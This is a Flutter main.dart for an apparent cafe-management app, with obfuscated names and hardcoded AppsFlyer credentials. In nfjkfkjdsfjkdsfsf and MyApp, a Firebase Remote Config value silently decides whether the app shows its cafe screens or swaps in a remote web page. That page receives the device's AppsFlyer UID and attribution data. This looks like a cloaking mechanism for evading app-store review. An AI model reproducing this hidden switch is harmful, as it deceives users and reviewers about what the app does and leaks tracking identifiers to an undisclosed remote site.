import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/utils.dart';
import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/cafe/bloc/cafe_bloc.dart';
import 'features/inventory/bloc/inventory_bloc.dart';
import 'features/news/bloc/news_bloc.dart';
import 'features/revenue/bloc/revenue_bloc.dart';
import 'features/settings/pages/firebase_options.dart';
import 'features/settings/pages/settings_page.dart';

int fndsjkfsd = 0;
String gdfgdfgd = '';
late AppsflyerSdk _appsflyerSdk;
String adsada = '';
bool stat = false;
String fsefmsdjk = '';
String sadas = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await nfjksdfjkdsf();
  inidasd();
  await initHive();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

void inidasd() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'EjB2oxnrzjoLfcdgoJtWFh',
    appId: '6670402592',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );
  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    sadas = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    fsefmsdjk = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  gdfgdfgd = await _appsflyerSdk.getAppsFlyerUID() ?? '';
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<void> nfjksdfjkdsf() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/category1.png'), context);
    precacheImage(const AssetImage('assets/category2.png'), context);
    precacheImage(const AssetImage('assets/category3.png'), context);
    precacheImage(const AssetImage('assets/category4.png'), context);
    precacheImage(const AssetImage('assets/category5.png'), context);

    return FutureBuilder<bool>(
      future: nfjkfkjdsfjkdsfsf(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.black,
          );
        } else {
          if (snapshot.data == true && njksakdjnkas != '') {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: Cafes(
                cafexas: njksakdjnkas,
                capucino: gdfgdfgd,
                milk: sadas,
              ),
            );
          } else {
            return MultiBlocProvider(
              providers: [
                BlocProvider(create: (context) => CafeBloc()),
                BlocProvider(create: (context) => InventoryBloc()),
                BlocProvider(create: (context) => RevenueBloc()),
                BlocProvider(create: (context) => NewsBloc()),
              ],
              child: MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              ),
            );
          }
        }
      },
    );
  }
}

String njksakdjnkas = '';

Future<bool> nfjkfkjdsfjkdsfsf() async {
  final njda = FirebaseRemoteConfig.instance;
  await njda.fetchAndActivate();
  String dsdfdsfgdg = njda.getString('giod');
  String cdsfgsdx = njda.getString('fode');
  if (!dsdfdsfgdg.contains('noxa')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      njksakdjnkas = dsdfdsfgdg;
      return true;
    } else {
      return false;
    }
  }
  return dsdfdsfgdg.contains('noxa') ? false : true;
}
